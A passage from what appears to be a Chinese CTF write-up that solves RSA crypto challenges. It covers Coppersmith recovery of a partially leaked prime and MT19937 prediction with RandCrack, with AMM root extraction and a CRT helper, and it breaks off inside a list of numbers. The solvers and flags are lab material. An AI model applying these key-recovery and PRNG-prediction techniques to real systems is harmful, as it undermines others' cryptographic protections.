2319000650261946023915014206488070911640109367250016568220614383532952214807761334558144208472659838958984936464737359601178199471300591809378861719725166071293490337849460977334088817981122030848611809302595213167700327022424485330558133803551058332751191386670140430591951239225137235559261920346492292931776544999900411323158373028200548312764177981464990638015835702492874152704590840093556205478901618714235042276132193643820011286079020600820330604377153242537768363399127325275405368576324108320705517778045911592243192206637554003492442058363346021771705706076757889394174566970697156452713746460116694890476180599323974313009004900787705445305524094335957604088726075970520060978159945766075715871582835253817257735855172650619000718520587778706871170904747089132157549968207256556609060157681221165756365791620541073993550257247751386345594088623340417061806929245714999520220438960372195265546782502907343855788577</span></span><br><span class="line"><span class="string">c = 1312431694904328111780426560035505882847885739731876317571257464906825734204933816113372504839088670643195989177569949377517123438201824279247608568699561057482330558039296008315782977478101848813741726654243732783839391998886721404635297928977792605627502180127696927378119466225798392853417088954570631565570973202717529604340075835044597519741996534553925543479235889306624531207327427624103988434939518732341796383732086485277180212113415284650071149267580793350758438950453934211274178830302236693064826616375397152045594336577917485934307703262074980594657132021858937328828017831874934945555874286196775661905842629738284617715824957593409581994376032525637671092419057427541956714584967278598190421273604293216212080790867530792388678597948920872325098486444223785108892158072625104934781926821974205890499552986515486164864944654160208151684128390420512040349571993995324224935664722188207527753890311873774929256151</span></span><br><span class="line"><span class="string">hint1 = 104933</span></span><br><span class="line"><span class="string">hint2 = 249231134914993957949482231198967609483717484780914014047312121163289039867757770164810674646280242374849088943758284579101792336244843385393432327534356753329591313697147372369033868132522997567291163165320430574331836011085519584900949698</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>泄露了<code>p</code>低20位和<code>p</code>30位后的800位，用 <code>Coppersmith</code>即可求出高位，低20-30位爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">2319000650261946023915014206488070911640109367250016568220614383532952214807761334558144208472659838958984936464737359601178199471300591809378861719725166071293490337849460977334088817981122030848611809302595213167700327022424485330558133803551058332751191386670140430591951239225137235559261920346492292931776544999900411323158373028200548312764177981464990638015835702492874152704590840093556205478901618714235042276132193643820011286079020600820330604377153242537768363399127325275405368576324108320705517778045911592243192206637554003492442058363346021771705706076757889394174566970697156452713746460116694890476180599323974313009004900787705445305524094335957604088726075970520060978159945766075715871582835253817257735855172650619000718520587778706871170904747089132157549968207256556609060157681221165756365791620541073993550257247751386345594088623340417061806929245714999520220438960372195265546782502907343855788577</span></span><br><span class="line">c = <span class="number">1312431694904328111780426560035505882847885739731876317571257464906825734204933816113372504839088670643195989177569949377517123438201824279247608568699561057482330558039296008315782977478101848813741726654243732783839391998886721404635297928977792605627502180127696927378119466225798392853417088954570631565570973202717529604340075835044597519741996534553925543479235889306624531207327427624103988434939518732341796383732086485277180212113415284650071149267580793350758438950453934211274178830302236693064826616375397152045594336577917485934307703262074980594657132021858937328828017831874934945555874286196775661905842629738284617715824957593409581994376032525637671092419057427541956714584967278598190421273604293216212080790867530792388678597948920872325098486444223785108892158072625104934781926821974205890499552986515486164864944654160208151684128390420512040349571993995324224935664722188207527753890311873774929256151</span></span><br><span class="line">hint1 = <span class="number">104933</span></span><br><span class="line">hint2 = <span class="number">249231134914993957949482231198967609483717484780914014047312121163289039867757770164810674646280242374849088943758284579101792336244843385393432327534356753329591313697147372369033868132522997567291163165320430574331836011085519584900949698</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">10</span>+<span class="number">1</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = (hint2*<span class="number">2</span>**<span class="number">30</span>) + (i*<span class="number">2</span>**<span class="number">20</span>) + hint1 + (x*<span class="number">2</span>**<span class="number">830</span>)</span><br><span class="line">    x0 = f.monic().small_roots(X=<span class="number">2</span>^(<span class="number">1024</span>-<span class="number">830</span>),beta=<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> x0:</span><br><span class="line">        p = (hint2*<span class="number">2</span>**<span class="number">30</span>) + (i*<span class="number">2</span>**<span class="number">20</span>) + hint1 + (x0[<span class="number">0</span>]*<span class="number">2</span>**<span class="number">830</span>)</span><br><span class="line">        d = gmpy2.invert(<span class="built_in">int</span>(e), <span class="built_in">int</span>((p - <span class="number">1</span>)))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, p)</span><br><span class="line">        flag = long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;C0pp3R_W0u1d_B3_T4sty_W1tH_F0rc3&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week2-strange-random"><a href="#Week2-strange-random" class="headerlink" title="[Week2] strange random"></a>[Week2] strange random</h2><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> prime</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sssstranger</span>(<span class="params">p,q</span>):</span><br><span class="line">    n = p*q</span><br><span class="line">    <span class="built_in">list</span>=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">312</span>):</span><br><span class="line">        x=random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        <span class="built_in">list</span>.append(x)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q=getStrongPrime(<span class="number">512</span>)</span><br><span class="line">r=getStrongPrime(<span class="number">512</span>)</span><br><span class="line">n1=sssstranger(p,q)</span><br><span class="line"><span class="built_in">print</span>(n1)</span><br><span class="line">n2=sssstranger(q,r)</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line">e=random.getrandbits(<span class="number">32</span>)</span><br><span class="line">m=bytes_to_long(<span class="string">b&quot;xxx&quot;</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n1*n2//q)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[1728665541, 3263255435, 2691063119, 513420434, 1978667458, 2092691241, 3072561387, 378231450, 3028786976, 840997868, 3471062203, 3920316636, 3916637804, 2376627024, 3173388560, 3539723936, 3614347224, 1379925726, 627801586, 2033110031, 3011670978, 2445060030, 3597825709, 1550315482, 3554680797, 536809681, 2468123914, 2237079688, 2296929082, 509016983, 1311981805, 587441307, 1250231566, 1315700906, 776365185, 2859464782, 3355190319, 1918102563, 211231701, 845506441, 3178972471, 3192228027, 1529640612, 1191656594, 484407364, 2429115020, 1919153985, 4078408440, 202834614, 3117949094, 3476209197, 4079805955, 111463567, 3658322943, 1016273317, 807556240, 3367455806, 2847052298, 2082435398, 1180401345, 3299362819, 4184474116, 2494750167, 4096990231, 1612750035, 770130274, 1733434788, 3092462951, 172910303, 2670474919, 362297276, 2782760415, 2884584980, 2326865163, 720680806, 1281073207, 950149740, 2778388627, 3101343550, 2770433242, 2788026555, 1262935285, 3581320389, 4194538979, 696994625, 821111473, 2806414521, 777650820, 3663930324, 4178227152, 606200040, 2069454582, 2173681644, 2922086151, 2020623409, 3758719473, 1312449069, 2927391874, 4270320113, 3753066345, 1995980698, 4258470255, 1327644070, 3351177965, 298217788, 2620469257, 2989578615, 4055438139, 3942865412, 1622171985, 4273198698, 1243493635, 1396590445, 2402566178, 4029896237, 1025694233, 2314450406, 4170179809, 4024445981, 1994273208, 1861210759, 1803769206, 3689618816, 2927243579, 1922806785, 2486390395, 1862533438, 1121029203, 2031745224, 3841331572, 3769538458, 842401540, 2163702504, 831385340, 376394126, 3974915965, 4034996030, 1854785567, 2555092021, 3046897262, 1094027606, 907771043, 384404822, 3501497369, 216697168, 226807575, 2747644288, 1972752441, 3105815096, 828173042, 3678659380, 764441556, 1130297460, 1402863762, 3970725436, 3086776368, 344855794, 2088029785, 503832722, 1968203466, 279790788, 3883395066, 4037131559, 1964635994, 1743508595, 3532171326, 1818297125, 2848875183, 1136249744, 4272443113, 1788562924, 3711074145, 418022453, 4283864580, 1386827219, 2059781647, 449497651, 469589888, 3588436437, 351986216, 3443966898, 2319253729, 1266070779, 1630403341, 1846437281, 3603091148, 447407528, 1442665148, 928268668, 2054879461, 774139131, 2430644896, 3555838468, 2030660868, 3319238578, 1015731571, 3478144019, 2453174776, 1941944791, 2053565326, 4110536281, 2526460393, 2824479032, 3301735760, 780255490, 1603208589, 1692469907, 3130130497, 3584634807, 3928107012, 509990258, 1869589899, 1905903514, 2952291895, 1729434633, 2044093816, 970234210, 1567208463, 2796641501, 1745350460, 3822138868, 2103785872, 391350339, 4191592334, 137687673, 4006137512, 1593615631, 1861899739, 3651189911, 520633354, 1966539346, 169641067, 1406362177, 737946704, 784276247, 2058995198, 3549499398, 1558398384, 3675852813, 1429069728, 2298431975, 2898233687, 286239555, 392193984, 3086032521, 3126507866, 34675686, 2287440422, 2548373557, 836659862, 99648826, 1083241258, 3636664381, 3251127672, 3516486155, 3869736806, 3646281836, 1700118982, 2156956, 1800018184, 777416396, 322014799, 3243611333, 1128026911, 4092136383, 2745524281, 751830889, 4158398986, 2017168515, 4209181862, 1454303529, 4210187982, 2987136052, 118405085, 2154307567, 2706958148, 783722604, 3630718307, 2946126077, 3769533841, 1952446395, 2864470266, 2438635144, 109801110, 2106815318, 1964646247, 2230611498, 3926379899, 2415862583, 2403244187, 1558995124, 755524922, 3392617372, 3025516874, 4190475123, 2949921629, 501571073, 4156590328, 4269504697, 2949638988, 1468559288, 3213839184, 2489556309, 3740310282, 2197691296, 2398027688, 3828617697, 1569783402, 2795666101, 176638489, 2911249476, 4241926468]</span></span><br><span class="line"><span class="string">138851415190713465480971174257448869324235475491224608863667367765557787130928841140544464901159451427142751973587286540048280289357977393428301017662916668537581389547284678037051116847831257571725930334961572331109949981542324563168168819931774176415705884732805196594752559820155791993081799451192512108559</span></span><br><span class="line"><span class="string">[942815517, 2520455710, 1891728341, 2453497085, 3941880462, 2392891255, 2747143494, 4243618507, 1517358347, 450211540, 2842693883, 1221103042, 1422891239, 4030144964, 2685521942, 1947290728, 3302832218, 1782499203, 3868364088, 308582506, 4251094005, 4980868, 2451326086, 3651628499, 2281074832, 480798516, 758959082, 3615264118, 1219594762, 1098658489, 2470901076, 1893356372, 3318772649, 1863044573, 3548017752, 3763808736, 1654584736, 3003555639, 1256437939, 3270885177, 258743642, 1299719645, 2208182535, 373707415, 1911873380, 92306350, 1545073247, 3827312104, 3255398601, 3192552708, 3206214673, 420879235, 1364502459, 3758282150, 2525185637, 1668948490, 1540972099, 4226808177, 2383393173, 3749471576, 1454575032, 3539841865, 690099204, 3429693556, 3143045768, 1019783847, 4254140560, 3362875271, 4286952044, 3651977835, 3979297548, 3354687702, 732498631, 830001339, 1600709940, 256242259, 3433896402, 717208932, 1143942721, 1387817800, 4149665963, 4136218742, 1148960729, 3448152230, 88647458, 1774354757, 3157382396, 2749420283, 3384884111, 4052749938, 3562466643, 388123649, 1019572873, 9288731, 2722126277, 2203755362, 2808094116, 318555465, 4238001430, 1279580330, 2688604848, 1360319839, 2479873580, 1061154987, 2958583972, 479553026, 1527664208, 1632893535, 3787166229, 989207338, 1663447933, 3712938090, 4198966560, 2566654848, 3696114905, 3012771350, 3607688877, 913491574, 3931397722, 3009342175, 2443448349, 1062996946, 2981037281, 26940862, 949228546, 4200949390, 4183590581, 1149500333, 2868274151, 1076013183, 2931224950, 1231187554, 1432454474, 462283109, 2459428825, 2313869884, 3779120205, 671163379, 283074107, 4292451272, 2073686644, 2106538278, 795977087, 1521261558, 2211934761, 3442006668, 810921154, 657699377, 2190946289, 3774455606, 95125385, 2480329023, 3476089304, 1238475919, 1076726394, 2120212816, 912904401, 3115487553, 4166801889, 2671842223, 3233061625, 2792720396, 164231023, 2899715615, 1080603752, 1871958768, 3205958631, 1429172605, 102859110, 1233358091, 4121045015, 3707468958, 2054107845, 3086180315, 3618494768, 151289595, 2395511379, 2202211183, 3317167416, 924499924, 1123843927, 1845597735, 2551305188, 281765988, 2688253086, 1560780497, 2061169891, 573571184, 2525386268, 1825854571, 2899785981, 3266712321, 3610412586, 411137454, 3935324159, 2494782798, 3373400635, 909758036, 730762387, 821217945, 1637755246, 914390627, 364271532, 3570237156, 739531656, 3535813993, 3136577043, 269001524, 330161113, 1582587768, 4276579985, 650173619, 2350573855, 1233199180, 824190362, 2132064523, 1630599868, 3890164143, 3281849000, 443369842, 556256551, 3665988107, 168059217, 2459533678, 2959581748, 1266795043, 2541445057, 3690162432, 4033239960, 2747349823, 2527544983, 3483114688, 1912665005, 2589639629, 967006093, 3043481320, 1577789923, 888032317, 3135015646, 1807362947, 3974720459, 1028251582, 1395973950, 141248013, 3415448254, 2585771855, 1652904856, 2483847688, 1241390535, 2966558718, 80133169, 544591052, 117065220, 1259833545, 4287364552, 3172964645, 1378147180, 1961149024, 2557044426, 3079500155, 1278712539, 2437075468, 4079403208, 1424357113, 1460980393, 1869711134, 739995379, 236457792, 56725573, 1192143182, 3480051881, 1940191085, 2145576244, 277256288, 1350391298, 927908951, 234611527, 1270659504, 2800736156, 2377033778, 379042674, 268642839, 254414386, 3717739293, 3742427571, 2062173352, 1468838866, 3248800238, 3810334297, 1774562996, 3243508531, 768385892, 3663776790, 3561471474, 2072506584, 4072612194, 4145385651, 1568151342, 413061947, 2606711318, 787242867, 358259431, 3250866366, 496471679, 3974003161, 3962245443, 3448346690, 3918858426, 1545049592, 4098252582, 4272944055, 2709981394]</span></span><br><span class="line"><span class="string">114667370859267713459979739172691665204879151133165169917752071845350748196947769536460950730177555853607685665148468694999487984430241339705779225600425842398781387739352517522092529671186262329583850232443458354943390042125768975735770226662059908491110663467968924345474794260851510527271024718213859872091</span></span><br><span class="line"><span class="string">254437839234710932548963084800696912447199841209292016504026652383142017227876963989808065988983617626350151358444895183944611290313513729505521630711812174923796964838915751672967332321515720258149777206328112312514688748335753179198631177743199829645308091442800427146012476434191025450662950787631144984158609948536064605299987908223963902731920237033619141863042816600729594847568654431928343565350409273886054122366132475796004834811862120850908513978375240</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>先通过<code>GCD(n1,n2)</code>求出<code>q</code>，从而求出<code>p</code>和<code>r</code></p>
<p>接着使用<code>RandCrack</code>预测随机数得到<code>e</code>，因为<code>e</code>和phi不互素，因此需要用AMM来进行有限域开方</p>
<p>这里我用<code>r</code>做后续的计算，<code>gcd(e,r-1)==4</code>，因此先求出<code>m^4</code>的值，然后再AMM开4次方即可得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">e, p</span>):</span><br><span class="line">    root = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(root) &lt; e:</span><br><span class="line">        a = random.randint(<span class="number">2</span>, p - <span class="number">1</span>)</span><br><span class="line">        res = <span class="built_in">pow</span>(a, (p - <span class="number">1</span>) // e, p)</span><br><span class="line">        <span class="keyword">if</span> res <span class="keyword">not</span> <span class="keyword">in</span> root:</span><br><span class="line">            root.append(res)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">residue, e, p</span>):</span><br><span class="line">    <span class="comment"># 计算t,s</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    s = p - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> s % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        s = s // e</span><br><span class="line"></span><br><span class="line">    d = gmpy2.invert(e, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">pow</span>(residue, d, p)</span><br><span class="line"></span><br><span class="line">    noresidue = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">pow</span>(noresidue, (p - <span class="number">1</span>) // e, p) == <span class="number">1</span>:</span><br><span class="line">        noresidue = random.randint(<span class="number">1</span>, p)</span><br><span class="line">    a = <span class="built_in">pow</span>(noresidue, (e ** (t - <span class="number">1</span>)) * s, p)</span><br><span class="line">    b = <span class="built_in">pow</span>(residue, e * d - <span class="number">1</span>, p)</span><br><span class="line">    c = <span class="built_in">pow</span>(noresidue, s, p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b, e ** (t - <span class="number">1</span> - i), p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d, a)</span><br><span class="line">        b = <span class="built_in">pow</span>(<span class="built_in">pow</span>(c, e, p), j, p) * b % p</span><br><span class="line">        h = <span class="built_in">pow</span>(c, j, p) * h % p</span><br><span class="line">        c = <span class="built_in">pow</span>(c, e, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(residue, d, p) * h % p</span><br><span class="line"></span><br><span class="line"><span class="comment">#中国剩余定理脚本，m_list为余数，a_list为除数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_Mi</span>(<span class="params">m_list, m</span>):</span><br><span class="line">    M_list = []</span><br><span class="line">    <span class="keyword">for</span> mi <span class="keyword">in</span> m_list:</span><br><span class="line">        M_list.append(m // mi)</span><br><span class="line">    <span class="keyword">return</span> M_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_resMi</span>(<span class="params">M_list, m_list</span>):</span><br><span class="line">    resM_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(M_list)):</span><br><span class="line">        resM_list.append(Get_ni(M_list[i], m_list[i])[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> resM_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_ni</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        x = <span class="number">1</span></span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line">        q = a</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">    ret = Get_ni(b, a % b)</span><br><span class="line">    x = ret[<span class="number">0</span>]</span><br><span class="line">    y = ret[<span class="number">1</span>]</span><br><span class="line">    q = ret[<span class="number">2</span>]</span><br><span class="line">    temp = x</span><br><span class="line">    x = y</span><br><span class="line">    y = temp - a // b * y</span><br><span class="line">    <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">result</span>(<span class="params">a_list, m_list</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m_list)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(m_list)):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> != math.gcd(m_list[i], m_list[j]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;不能直接利用中国剩余定理&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    m = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> mi <span class="keyword">in</span> m_list:</span><br><span class="line">        m *= mi</span><br><span class="line">    Mi_list = Get_Mi(m_list, m)</span><br><span class="line">    Mi_inverse = Get_resMi(Mi_list, m_list)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a_list)):</span><br><span class="line">        x += Mi_list[i] * Mi_inverse[i] * a_list[i]</span><br><span class="line">        x %= m</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">l1 = [<span class="number">1728665541</span>, <span class="number">3263255435</span>, <span class="number">2691063119</span>, <span class="number">513420434</span>, <span class="number">1978667458</span>, <span class="number">2092691241</span>, <span class="number">3072561387</span>, <span class="number">378231450</span>, <span class="number">3028786976</span>, <span class="number">840997868</span>, <span class="number">3471062203</span>, <span class="number">3920316636</span>, <span class="number">3916637804</span>, <span class="number">2376627024</span>, <span class="number">3173388560</span>, <span class="number">3539723936</span>, <span class="number">3614347224</span>, <span class="number">1379925726</span>, <span class="number">627801586</span>, <span class="number">2033110031</span>, <span class="number">3011670978</span>, <span class="number">2445060030</span>, <span class="number">3597825709</span>, <span class="number">1550315482</span>, <span class="number">3554680797</span>, <span class="number">536809681</span>, <span class="number">2468123914</span>, <span class="number">2237079688</span>, <span class="number">2296929082</span>, <span class="number">509016983</span>, <span class="number">1311981805</span>, <span class="number">587441307</span>, <span class="number">1250231566</span>, <span class="number">1315700906</span>, <span class="number">776365185</span>, <span class="number">2859464782</span>, <span class="number">3355190319</span>, <span class="number">1918102563</span>, <span class="number">211231701</span>, <span class="number">845506441</span>, <span class="number">3178972471</span>, <span class="number">3192228027</span>, <span class="number">1529640612</span>, <span class="number">1191656594</span>, <span class="number">484407364</span>, <span class="number">2429115020</span>, <span class="number">1919153985</span>, <span class="number">4078408440</span>, <span class="number">202834614</span>, <span class="number">3117949094</span>, <span class="number">3476209197</span>, <span class="number">4079805955</span>, <span class="number">111463567</span>, <span class="number">3658322943</span>, <span class="number">1016273317</span>, <span class="number">807556240</span>, <span class="number">3367455806</span>, <span class="number">2847052298</span>, <span class="number">2082435398</span>, <span class="number">1180401345</span>, <span class="number">3299362819</span>, <span class="number">4184474116</span>, <span class="number">2494750167</span>, <span class="number">4096990231</span>, <span class="number">1612750035</span>, <span class="number">770130274</span>, <span class="number">1733434788</span>, <span class="number">3092462951</span>, <span class="number">172910303</span>, <span class="number">2670474919</span>, <span class="number">362297276</span>, <span class="number">2782760415</span>, <span class="number">2884584980</span>, <span class="number">2326865163</span>, <span class="number">720680806</span>, <span class="number">1281073207</span>, <span class="number">950149740</span>, <span class="number">2778388627</span>, <span class="number">3101343550</span>, <span class="number">2770433242</span>, <span class="number">2788026555</span>, <span class="number">1262935285</span>, <span class="number">3581320389</span>, <span class="number">4194538979</span>, <span class="number">696994625</span>, <span class="number">821111473</span>, <span class="number">2806414521</span>, <span class="number">777650820</span>, <span class="number">3663930324</span>, <span class="number">4178227152</span>, <span class="number">606200040</span>, <span class="number">2069454582</span>, <span class="number">2173681644</span>, <span class="number">2922086151</span>, <span class="number">2020623409</span>, <span class="number">3758719473</span>, <span class="number">1312449069</span>, <span class="number">2927391874</span>, <span class="number">4270320113</span>, <span class="number">3753066345</span>, <span class="number">1995980698</span>, <span class="number">4258470255</span>, <span class="number">1327644070</span>, <span class="number">3351177965</span>, <span class="number">298217788</span>, <span class="number">2620469257</span>, <span class="number">2989578615</span>, <span class="number">4055438139</span>, <span class="number">3942865412</span>, <span class="number">1622171985</span>, <span class="number">4273198698</span>, <span class="number">1243493635</span>, <span class="number">1396590445</span>, <span class="number">2402566178</span>, <span class="number">4029896237</span>, <span class="number">1025694233</span>, <span class="number">2314450406</span>, <span class="number">4170179809</span>, <span class="number">4024445981</span>, <span class="number">1994273208</span>, <span class="number">1861210759</span>, <span class="number">1803769206</span>, <span class="number">3689618816</span>, <span class="number">2927243579</span>, <span class="number">1922806785</span>, <span class="number">2486390395</span>, <span class="number">1862533438</span>, <span class="number">1121029203</span>, <span class="number">2031745224</span>, <span class="number">3841331572</span>, <span class="number">3769538458</span>, <span class="number">842401540</span>, <span class="number">2163702504</span>, <span class="number">831385340</span>, <span class="number">376394126</span>, <span class="number">3974915965</span>, <span class="number">4034996030</span>, <span class="number">1854785567</span>, <span class="number">2555092021</span>, <span class="number">3046897262</span>, <span class="number">1094027606</span>, <span class="number">907771043</span>, <span class="number">384404822</span>, <span class="number">3501497369</span>, <span class="number">216697168</span>, <span class="number">226807575</span>, <span class="number">2747644288</span>, <span class="number">1972752441</span>, <span class="number">3105815096</span>, <span class="number">828173042</span>, <span class="number">3678659380</span>, <span class="number">764441556</span>, <span class="number">1130297460</span>, <span class="number">1402863762</span>, <span class="number">3970725436</span>, <span class="number">3086776368</span>, <span class="number">344855794</span>, <span class="number">2088029785</span>, <span class="number">503832722</span>, <span class="number">1968203466</span>, <span class="number">279790788</span>, <span class="number">3883395066</span>, <span class="number">4037131559</span>, <span class="number">1964635994</span>, <span class="number">1743508595</span>, <span class="number">3532171326</span>, <span class="number">1818297125</span>, <span class="number">2848875183</span>, <span class="number">1136249744</span>, <span class="number">4272443113</span>, <span class="number">1788562924</span>, <span class="number">3711074145</span>, <span class="number">418022453</span>, <span class="number">4283864580</span>, <span class="number">1386827219</span>, <span class="number">2059781647</span>, <span class="number">449497651</span>, <span class="number">469589888</span>, <span class="number">3588436437</span>, <span class="number">351986216</span>, <span class="number">3443966898</span>, <span class="number">2319253729</span>, <span class="number">1266070779</span>, <span class="number">1630403341</span>, <span class="number">1846437281</span>, <span class="number">3603091148</span>, <span class="number">447407528</span>, <span class="number">1442665148</span>, <span class="number">928268668</span>, <span class="number">2054879461</span>, <span class="number">774139131</span>, <span class="number">2430644896</span>, <span class="number">3555838468</span>, <span class="number">2030660868</span>, <span class="number">3319238578</span>, <span class="number">1015731571</span>, <span class="number">3478144019</span>, <span class="number">2453174776</span>, <span class="number">1941944791</span>, <span class="number">2053565326</span>, <span class="number">4110536281</span>, <span class="number">2526460393</span>, <span class="number">2824479032</span>, <span class="number">3301735760</span>, <span class="number">780255490</span>, <span class="number">1603208589</span>, <span class="number">1692469907</span>, <span class="number">3130130497</span>, <span class="number">3584634807</span>, <span class="number">3928107012</span>, <span class="number">509990258</span>, <span class="number">1869589899</span>, <span class="number">1905903514</span>, <span class="number">2952291895</span>, <span class="number">1729434633</span>, <span class="number">2044093816</span>, <span class="number">970234210</span>, <span class="number">1567208463</span>, <span class="number">2796641501</span>, <span class="number">1745350460</span>, <span class="number">3822138868</span>, <span class="number">2103785872</span>, <span class="number">391350339</span>, <span class="number">4191592334</span>, <span class="number">137687673</span>, <span class="number">4006137512</span>, <span class="number">1593615631</span>, <span class="number">1861899739</span>, <span class="number">3651189911</span>, <span class="number">520633354</span>, <span class="number">1966539346</span>, <span class="number">169641067</span>, <span class="number">1406362177</span>, <span class="number">737946704</span>, <span class="number">784276247</span>, <span class="number">2058995198</span>, <span class="number">3549499398</span>, <span class="number">1558398384</span>, <span class="number">3675852813</span>, <span class="number">1429069728</span>, <span class="number">2298431975</span>, <span class="number">2898233687</span>, <span class="number">286239555</span>, <span class="number">392193984</span>, <span class="number">3086032521</span>, <span class="number">3126507866</span>, <span class="number">34675686</span>, <span class="number">2287440422</span>, <span class="number">2548373557</span>, <span class="number">836659862</span>, <span class="number">99648826</span>, <span class="number">1083241258</span>, <span class="number">3636664381</span>, <span class="number">3251127672</span>, <span class="number">3516486155</span>, <span class="number">3869736806</span>, <span class="number">3646281836</span>, <span class="number">1700118982</span>, <span class="number">2156956</span>, <span class="number">1800018184</span>, <span class="number">777416396</span>, <span class="number">322014799</span>, <span class="number">3243611333</span>, <span class="number">1128026911</span>, <span class="number">4092136383</span>, <span class="number">2745524281</span>, <span class="number">751830889</span>, <span class="number">4158398986</span>, <span class="number">2017168515</span>, <span class="number">4209181862</span>, <span class="number">1454303529</span>, <span class="number">4210187982</span>, <span class="number">2987136052</span>, <span class="number">118405085</span>, <span class="number">2154307567</span>, <span class="number">2706958148</span>, <span class="number">783722604</span>, <span class="number">3630718307</span>, <span class="number">2946126077</span>, <span class="number">3769533841</span>, <span class="number">1952446395</span>, <span class="number">2864470266</span>, <span class="number">2438635144</span>, <span class="number">109801110</span>, <span class="number">2106815318</span>, <span class="number">1964646247</span>, <span class="number">2230611498</span>, <span class="number">3926379899</span>, <span class="number">2415862583</span>, <span class="number">2403244187</span>, <span class="number">1558995124</span>, <span class="number">755524922</span>, <span class="number">3392617372</span>, <span class="number">3025516874</span>, <span class="number">4190475123</span>, <span class="number">2949921629</span>, <span class="number">501571073</span>, <span class="number">4156590328</span>, <span class="number">4269504697</span>, <span class="number">2949638988</span>, <span class="number">1468559288</span>, <span class="number">3213839184</span>, <span class="number">2489556309</span>, <span class="number">3740310282</span>, <span class="number">2197691296</span>, <span class="number">2398027688</span>, <span class="number">3828617697</span>, <span class="number">1569783402</span>, <span class="number">2795666101</span>, <span class="number">176638489</span>, <span class="number">2911249476</span>, 